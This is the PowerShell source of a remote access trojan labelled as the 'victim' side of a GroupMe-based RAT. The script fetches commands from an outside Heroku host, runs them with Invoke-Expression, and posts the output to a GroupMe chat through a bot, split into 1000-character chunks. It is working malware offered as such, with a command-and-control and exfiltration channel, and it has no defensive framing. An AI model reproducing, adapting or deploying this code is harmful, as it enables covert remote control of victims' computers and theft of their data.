 # rat.ps1
# By: Bryton Herdes
# GroupME RAT - victim rat.ps1

#Function for sending messages from this victim to groupme chat. Messages will go through as the bot for the
#group it's a part of
function sendmsg() {
    # Send Invoke-RestMethod Portion #
    $Url="https://api.groupme.com/v3/bots/post"
    $Body= @{
            text="$cmd"
            bot_id="688958bd70cfbf125a71291636"
            }
    Invoke-RestMethod -Method POST -Uri $Url -Body $Body
}

# Function for getting the command to run and send 
function getcmd() {
    # Send Invoke-RestMethod Portion #
    $Url="https://rat-groupme.herokuapp.com/post"
    $Body= @{
            "name"="target"
            "text"="yea let's try"
            } | ConvertTo-Json
            
    $cmd=Invoke-RestMethod -Method POST -Uri $Url -Body $Body -ContentType "application/json"
    
    $cmd=$cmd | select text | ft -HideTableHeaders | Out-String
    $cmd=$cmd.Trim()
   
    return $cmd
}

function getNum() {
    $number=Invoke-RestMethod -Method POST -Uri $Url -Body $Body -ContentType "application/json"
    echo $number
    $number=$number | select number | ft -HideTableHeaders | Out-String
    $number=$number.Trim()
    $intNumber=[int]$number
    return $number
}

$exec_cmd=getcmd | Out-String
#echo $exec_cmd
$all=$exec_cmd.Split(",") | Out-String
#echo $all

[string]$i = ""

foreach ($d in $all) { 
###Send cmd output to chat!
    $exec_cmd = $d
    $tmp=Invoke-Expression -Command $exec_cmd
    $exec_cmd += $tmp | Out-String
    $count=$exec_cmd.Length
    #echo $count

    [int]$i=0
    [int]$j=999

    #if command string length is less than 1000, we can just send it straightaway
    if($count -lt 1000) {
        $cmd=$exec_cmd
        sendmsg
        continue
    }

    $k=$j

    for($j=999; $j -gt 1; $j+=1000) {
        if($j -ge $count) { #is J greater than the length of our command string
            $cmd=$exec_cmd.Substring($i,$k)
            # Send Invoke-RestMethod Portion #
            sendmsg
            break
        }
        else {
            $cmd=$exec_cmd.Substring($i,$k)
            # Send Invoke-RestMethod Portion #
            sendmsg
            $i=$j
            $k=$count - $j - 2
        if($k -ge 1000) { #limited length of message 1k characters
            $k=999
        }
    }  
}

} 

